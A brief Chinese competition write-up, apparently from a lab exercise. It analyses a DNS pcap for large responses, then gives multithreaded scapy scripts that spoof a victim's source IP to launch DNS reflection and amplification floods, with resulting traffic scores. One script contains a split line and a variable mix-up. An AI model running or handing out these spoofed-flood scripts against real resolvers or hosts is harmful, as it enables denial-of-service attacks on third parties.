前言：师兄带我做比赛当时的一小部分解决方案。但是好像用处不大。

## pcap分析

用pyshark进行分析，尝试提取出response最大的请求：

```python
import pyshark

def find_large_responses(pcap_file, top_n=10):
    """
    解析 PCAP 文件，找到响应数据量大的域名。
    :param pcap_file: PCAP 文件路径
    :param top_n: 输出响应最大的前 N 个域名
    """
    dns_responses = []

    # 读取 PCAP 文件
    cap = pyshark.FileCapture(pcap_file, display_filter="dns")

    for pkt in cap:
        try:
            # 提取 DNS 响应信息
            if hasattr(pkt.dns, 'qry_name') and hasattr(pkt.dns, 'a'):
                query_name = pkt.dns.qry_name
                response_size = int(pkt.length)  # 数据包长度
                dns_responses.append((query_name, response_size))
                # if response_size > 10000:
                #     print(f"Domain: {query_name}, Response Size: {response_size},{pkt}")
        except AttributeError:
            continue

    # 按响应大小排序，获取前 N 个结果
    top_responses = sorted(dns_responses, key=lambda x: x[1], reverse=True)[:top_n]

    print(f"Top {top_n} largest DNS responses:")
    for domain, size in top_responses:
        print(f"Domain: {domain}, Response Size: {size}")

if __name__ == "__main__":
    pcap_file = r"check_fqdn.pcap"  # 替换为您的 PCAP 文件路径
    find_large_responses(pcap_file)
```

得到结果如下：

```shell
Top 10 largest DNS responses:
Domain: book.moonsixpence.com, Response Size: 11496
Domain: nxns.nsBailiwick.com, Response Size: 5388
Domain: nxns.intheory.com, Response Size: 3170
Domain: nxns.intro.com, Response Size: 2751
Domain: nxns.nsreferral.com, Response Size: 2688
Domain: nrd.bite.com, Response Size: 1980
Domain: nxns.nrdiv.com, Response Size: 1655
Domain: a.rodvrdt.com, Response Size: 1641
Domain: fedex.com, Response Size: 1598
Domain: yahoo.com, Response Size: 1148
```

## 传统放大攻击

伪造源ip发起请求，代码如下：

```python
import random
import time
import threading
from scapy.all import *

# Configuration
TARGET_IP = "172.19.0.5"  # Target server IP
DNS_SERVER = "8.8.8.8"  # DNS server to use (can be another public DNS server)
DOMAIN_SUFFIX = ".victim.com"  # Domain suffix

alphabet = "abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789"

# Generate a random domain
def generate_random_domain():
    domain = "".join(random.sample(alphabet, 80)) + DOMAIN_SUFFIX
    # domain = "book.moonsixpence.com"
    return domain

# Send DNS request
def send_dns_request(target_ip, dns_server):
    while True:
        domain = generate_random_domain()
      
        # Use Scapy to spoof the source IP and send a DNS query request
        dns_query = IP(dst=dns_server, src=target_ip) / UDP(dport=53, sport=random.randint(1024, 65535)) / DNS(rd=1, qd=DNSQR(qname=domain, qtype="ANY"))
        send(dns_query)
      
        # Send a request every 0.5 seconds
        time.sleep(0.01)

# Main function: Start multiple threads
def main():
    try:
        with open("ip.txt", "r") as f:
            data = f.readlines()
            for i in data:
                # Create a new thread for each DNS server
                t = threading.Thread(target=send_dns_request, args=(TARGET_IP, i.strip()))
                t.start()
    except Exception as e:
        print(f"Error: unable to start thread - {str(e)}")

if __name__ == "__main__":
    main()
```

tips_3数值会变大，最大值6.6M

## 对 health.com域名进行尝试

```python
import random
import time
import threading
from scapy.all import *

# Configuration
INTERMEDIARY_DNS = "172.19.23.112"  # Intermediary DNS server
AUTH_SERVER = "172.18.0.5"          # Authoritative DNS server (target)
DOMAIN = "health.health.com"        # Domain to query
SOURCE_IP = "172.18.0.5"            # Forged source IP

def generate_random_subdomain():
    """
    Generate a random subdomain to bypass DNS caching.
    """
    # random_subdomain = "".join(random.choices("abcdefghijklmnopqrstuvwxyz0123456789abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ", k=100))
    return f"{DOMAIN}"

def send_recursive_dns_request():
    """
    Send DNS queries to the intermediary server, triggering recursive queries to the authoritative server.
    """
    while True:
        # Generate a random subdomain
        domain = generate_random_subdomain()
      
        # Construct the DNS query packet
        dns_query = (
            IP(dst=INTERMEDIARY_DNS, src=SOURCE_IP) /  # Spoofed source IP
            UDP(dport=53, sport=random.randint(1024, 65535)) /
            DNS(rd=1, qd=DNSQR(qname=domain, qtype="A"))
        )
      
        # Send the query
        send(dns_query, verbose=0)
        # time.sleep(0.01)  # Adjust to control request rate

def main():
    """
    Launch multiple threads to increase attack throughput.
    """
    threads = []
    for _ in range(100):  # Number of threads
        t = threading.Thread(target=send_recursive_dns_request)
        t.start()
        threads.append(t)

    for t in threads:
        t.join()

if __name__ == "__main__":
    main()
```

本来尝试用172.18.0.3发，但效果不好，结果只有0-1k，不知何原因，改为.0.5发后系统判为tips_2，最大值为48K

## 对长返回值域名的尝试

本来打算对前十个都尝试，代码如下：

```python
import time
import threading
from scapy.all import *

# Configuration
TARGET_IP = "172.19.0.5"  # Target server IP
DOMAINS = [
    "book.moonsixpence.com",
    "nxns.nsBailiwick.com",
    "nxns.intheory.com",
    "nxns.intro.com",
    "nxns.nsreferral.com",
    "nrd.bite.com",
    "nxns.nrdiv.com",
    "a.rodvrdt.com",
    "fedex.com",
    "yahoo.com"
]
dns_server_ = "172.19.23.112"
# Load DNS servers from ip.txt
def load_dns_servers(file_path):
    try:
        with open(file_path, "r") as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"Error: File {file_path} not found.")
        return []

# Send DNS request
def send_dns_request(target_ip, dns_server):
    while True:
        for domain in DOMAINS:
            # Construct and send the DNS query
            dns_query = (
                IP(dst=dns_server, src=target_ip) /
                UDP(dport=53, sport=random.randint(1024, 65535)) /
                DNS(rd=1, qd=DNSQR(qname=domain, qtype="ANY"))
            )
            send(dns_query, verbose=False)
            # print(f"Sent DNS query for {domain} to {dns_server}")
          
            # Adjust the sleep time as needed
            time.sleep(0.01)

# Main function: Start multiple threads
def main():
    dns_servers = load_dns_servers("ip.txt")
    if not dns_servers:
        print("No DNS servers loaded. Exiting.")
        return
  
    threads = []
    try:
        for dns_server in dns_servers:
            t = threading.Thread(target=send_dns_request, args=(TARGET_IP, dns_s
erver_))
            threads.append(t)
            t.start()

        # Wait for threads to finish
        for t in threads:
            t.join()
    except Exception as e:
        print(f"Error: unable to start thread - {str(e)}")

if __name__ == "__main__":
    main()
```

后来只特定用

```shell
        Source Address: 172.19.0.7
        Destination Address: 172.19.23.112
        Stream index: 10
Layer TCP
:       Source Port: 53
        Destination Port: 43207
```

TXT类型，但效果均不好，最大值仅为约10K，估计需要做较大改动。

## 另注

代码文件均存储在攻击机根目录下，后面尝试的脚本均以q3test开头。
